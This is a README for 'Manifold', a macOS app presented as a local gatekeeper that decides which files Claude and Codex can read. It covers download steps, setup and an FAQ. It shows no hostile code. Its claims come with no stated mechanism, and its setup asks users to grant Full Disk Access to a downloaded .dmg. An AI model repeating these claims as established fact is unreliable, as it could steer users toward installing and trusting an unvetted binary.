# 🛡️ Manifold - Control your private data when using AI

[![](https://img.shields.io/badge/Download-Manifold-blue.svg)](https://github.com/jaclynsaline206/Manifold)

Manifold puts you in charge of the information your AI models can access. You choose which files Claude and Codex see before you share them. The app runs on your machine to protect your work, your notes, and your private data. 

## 🎯 What Manifold does

AI tools like Claude and Codex learn from the data you provide. Sometimes, you might upload a file that contains sensitive information by accident. Manifold prevents this by acting as a gatekeeper between your computer and these AI services.

- **File-by-File Permissions:** You decide what the AI sees. A file remains hidden from the system unless you grant access to it.
- **Privacy First:** Manifold runs on your hardware. It masks personal information before it leaves your machine.
- **Audit Logs:** You see a list of every file you shared and when you shared it.
- **Local Processing:** The app uses local tools to scrub sensitive data from your documents.

## 💻 System Requirements

Manifold runs on modern Apple computers using Apple Silicon chips. You need one of these processors to use the app:

- M1 chip
- M2 chip
- M3 chip
- M4 chip

Your computer needs to run macOS 13.0 or later. Ensure you have at least 200MB of free space on your hard drive for the installation.

## 🚀 Downloading the App

You can find the installer on the project website. Follow these steps to get the app onto your computer.

1. Go to the [Manifold GitHub Releases page](https://github.com/jaclynsaline206/Manifold).
2. Look for the latest version under the "Releases" section.
3. Click the link that ends in `.dmg` to download the installer to your Downloads folder.
4. Open your Downloads folder and double-click the file you just saved.
5. Follow the on-screen instructions to move the app into your Applications folder.

## ⚙️ Setting Up Your Privacy

The first time you open Manifold, the app asks for basic permissions. These permissions allow the app to see the files you want to secure.

1. Open Manifold from your Applications folder.
2. A window will appear asking for "Full Disk Access." This is standard for apps that manage file security.
3. Click "Open System Settings" when the prompt appears.
4. Locate Manifold in the list and toggle the switch to the "On" position.
5. Restart the app to finalize the setup.

## 🔒 Managing Your Files

Once the app is running, you will see a list of your recent folders. You can manage access from the main dashboard.

### Granting Access
To let an AI model look at a specific document, drag that document into the Manifold window. The app will tag the file as "Authorized." This means the file is available to your AI assistant.

### Revoking Access
If you no longer want a model to see a file, select the file in the Manifold list and click "Revoke." This action immediately blocks the AI from reading the file again.

## 🔍 Understanding the Privacy Filter

Manifold uses an on-device privacy filter to check your files for sensitive data. This filter flags information like your home address, credit card numbers, or login keys. 

When you share a file, the filter scans the document before the data leaves your computer. If the filter finds something sensitive, it asks if you want to mask the data. This masking happens locally, which means your sensitive text never touches the internet.

## 📜 Keeping Records

You might want to see which files you shared last week or last month. Manifold keeps a secure log of your interactions.

- Click the "History" tab in the app.
- You will see a list of dates, file names, and the actions taken.
- This creates an audit log for your personal records.
- You can export this log as a text file if you need to keep a permanent backup of your file sharing activity.

## 🛠️ Frequently Asked Questions

**Does Manifold store my files?**
No. Manifold only tracks the permissions you set. It does not upload, copy, or store your actual files on a server.

**Does this work with all AI models?**
Manifold is currently optimized for Claude and Codex. It works best when you use these specific tools.

**How do I update the app?**
When a new version is available, the app will show a notification. You can click the notification, visit the download page, and install the new version over the old one.

**Is it safe to reveal my PII?**
The app is designed to help you avoid sharing PII. Always check your files before clicking "Allow" in the dashboard.

## 🤝 Community and Support

The Manifold project is open source and licensed under the Apache 2.0 license. This means you can view the code, suggest changes, or report issues on the repository page. 

If you encounter an error, check the "Issues" tab on the GitHub page to see if another user found a fix. If you cannot find a solution, feel free to open a new report with a description of the problem. Please include your macOS version and the steps you took before the error occurred.